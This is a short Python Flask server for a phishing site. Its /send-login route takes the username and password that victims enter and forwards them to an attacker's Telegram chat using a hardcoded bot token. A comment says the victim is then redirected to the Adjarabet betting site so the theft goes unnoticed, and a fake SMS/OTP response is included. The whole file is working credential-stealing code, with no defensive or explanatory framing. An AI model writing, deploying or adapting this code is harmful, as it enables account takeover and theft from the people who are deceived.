from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================
# 🔒 ՍԱ ՍԵՐՎԵՐՈՒՄ Է ՊԱՀՎՈՒՄ - ՉԻ ԵՐԵՎՈՒՄ HTML-ՈՒՄ
# ============================================
BOT_TOKEN = '8785157352:AAFIb95We15ttXbXFibgTYTJR6IxrA5goAM'
CHAT_ID = '5215854157'
# ============================================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-login', methods=['POST', 'OPTIONS'])
def send_login():
    if request.method == 'OPTIONS':
        return '', 200
        
    try:
        data = request.get_json()
        username = data.get('username', '')
        password = data.get('password', '')
        
        if password == 'OTP_REQUEST':
            return jsonify({'ok': True, 'message': 'SMS მუშაობს', 'redirect': False})
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"""
<b>👤</b> <b><code>{username}</code></b>
<b>🔑</b> <b><code>{password}</code></b>
"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        requests.post(url, data=payload)
        
        # Վերադարձնում ենք հաջողություն և ասում, որ բացենք Adjarabet-ը
        return jsonify({'ok': True, 'message': '✅ მონაცემები მიღებულია', 'redirect': True})
        
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e), 'redirect': False})
        
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
